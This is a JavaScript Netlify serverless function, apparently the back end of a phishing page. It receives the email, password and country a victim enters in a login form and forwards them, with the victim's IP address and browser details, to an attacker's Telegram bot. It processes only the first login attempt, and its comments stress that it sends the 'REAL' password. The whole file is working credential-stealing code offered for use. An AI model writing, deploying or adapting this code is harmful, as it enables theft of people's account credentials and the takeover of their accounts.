// netlify/functions/login.js
// Final Corrected Version for Netlify
// This version sends both the REAL email and the REAL password to Telegram.
// It uses a safe message format to prevent API errors.

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-First-Attempt'
};

exports.handler = async (event) => {
  // Standard CORS preflight check for browsers
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: CORS_HEADERS,
      body: ''
    };
  }

  try {
    // Verify that the required secrets are available in the Netlify environment
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('FATAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in the Netlify environment.');
      return {
        statusCode: 500,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Server configuration error.' })
      };
    }

    // Only process the first login attempt from a browser session
    const isFirstAttempt = event.headers['x-first-attempt'] === '1' || event.headers['X-First-Attempt'] === '1';
    if (!isFirstAttempt) {
      return {
        statusCode: 200,
        headers: CORS_HEADERS,
        body: JSON.stringify({ forwarded: false, reason: 'not_first_attempt' })
      };
    }

    const body = JSON.parse(event.body || '{}');
    const { email, password, country } = body;
    
    // Ensure both email and password were provided
    if (!email || !password) {
      return {
        statusCode: 400,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Missing email or password' })
      };
    }

    const ip = (event.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
    const userAgent = event.headers['user-agent'] || 'unknown';
    const now = new Date();

    // --- THIS IS THE FIX ---
    // The dataBlock explicitly includes both the real email and real password.
    const dataBlock = [
      `Email: ${email}`,
      `Password: ${password}`,
      `IP: ${ip}`,
      `Country: ${country || 'N/A'}`,
      `User-Agent: ${userAgent}`,
      `Time (UTC): ${now.toISOString()}`
    ].join('\n');
    
    // Wrap the data in a MarkdownV2 code block for safety
    const text = `*Login Attempt from ${email}*\n\`\`\`\n${dataBlock}\n\`\`\``;

    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'MarkdownV2'
    };

    // Send the data to the Telegram API
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const tgJson = await tgRes.json();

    if (!tgJson.ok) {
      // If Telegram returns an error, log it to the Netlify function logs for debugging
      console.error('Telegram API Error:', tgJson.description);
      return {
        statusCode: 502,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Telegram API error', details: tgJson.description })
      };
    }

    // Success
    return {
      statusCode: 200,
      headers: CORS_HEADERS,
      body: JSON.stringify({ forwarded: true })
    };

  } catch (err) {
    console.error('Critical error in Netlify function execution:', err);
    return {
      statusCode: 500,
      headers: CORS_HEADERS,
      body: JSON.stringify({ error: 'Internal Server Error' })
    };
  }
};
